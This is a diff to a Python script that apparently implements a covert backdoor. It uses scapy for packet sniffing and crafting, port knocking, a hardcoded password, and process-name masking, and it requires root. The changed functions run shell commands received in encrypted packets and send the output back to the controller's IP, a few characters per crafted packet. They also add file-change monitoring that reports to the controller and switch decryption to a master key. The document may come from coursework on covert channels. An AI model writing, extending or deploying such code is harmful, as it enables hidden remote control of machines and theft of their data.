@@ -1,20 +1,23 @@
 #!/usr/bin/python
-
-import logging, setproctitle, triplesec, encryption, configfile, helpers
+import logging, setproctitle, triplesec, encryption, configfile, helpers, os, sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
+from watchdog.observers import Observer
+from fileWatch import FileWatch
 
 state = 0
 ports = [1000, 2000, 3000]
 password = 'abcdefyoyo'
 maxPort = 65535
+observer = Observer()
+watch= ''
 # unauthClients = {}
 # authedClients = {}
 
 def checkRoot():
     if(os.getuid() != 0):
-        exit("This program must be run with root. Try Again..")
+        sys.exit("This program must be run with root. Try Again..")
 
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
@@ -54,21 +57,47 @@ def shellCommand(packet, command):
     print "Running command " + command
     ip = packet[IP].src
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = configfile.password + output.stdout.read() + output.stderr.read()
-    encryptedData = encryption.encrypt(output, configfile.password)
+    output = output.stdout.read() + output.stderr.read()
+    encryptedData = encryption.encrypt(output, configfile.masterkey)
+    encryptedData = helpers.chunkString(2, encryptedData)
     lastIndex = len(encryptedData) - 1
-    for index, char in enumerate(encryptedData):
-        packet = helpers.createPacket(configfile.protocol, ip, char)
+    time.sleep(1)
+    for index, chunk in enumerate(encryptedData):
+        if len(chunk) == 2:
+            pairs = list(chunk)
+            packet = helpers.createPacketTwo(configfile.protocol, ip, pairs[0], pairs[1])
+        elif len(chunk) == 1:
+            packet = helpers.createPacketOne(configfile.protocol, ip, chunk)
         if index == lastIndex:
             packet = packet/Raw(load=configfile.password)
-        send(packet, verbose=0)
+        send(packet)
         time.sleep(0.1)
 
-def watchAdd():
-    print "watchAdd"
+    # helpers.sendMessage(encryptedData
+    #                    , configfile.password
+    #                    , configfile.protocol
+    #                    , ip
+    #                    , 8000)
+    
+
+def watchAdd(path, ip):
+    watch = observer.schedule(FileWatch(ip,configfile.protocol, configfile.password), path)
+    observer.start()
+    message = configfile.password + "Watch added"
+    encrptedMessage = encryption.encrypt(message, configfile.password)
+    helpers.sendMessage(encrptedMessage
+                       , configfile. password
+                       , configfile.protocol
+                       , ip
+                       , 8000)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        observer.stop()
 
 def watchRemove():
-    print "watchRemove"
+    observer.unschedule(watch)
 
 def screenshot():
     print "screenshot"
@@ -79,14 +108,14 @@ def exit():
 def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         encryptedData = packet['Raw'].load
-        data = encryption.decrypt(encryptedData, configfile.password)
+        data = encryption.decrypt(encryptedData, configfile.masterkey)
         if data.startswith(configfile.password):
             data = data[len(configfile.password):]
             commandType, commandString = data.split(' ', 1)
             if commandType == 'shell':
                 shellCommand(packet, commandString)
             elif commandType == 'watchAdd':
-                watchAdd()
+                watchAdd(commandString, packet[IP].src)
             elif commandType == 'watchRemove':
                 watchRemove()
             elif commandType == 'screenshot':
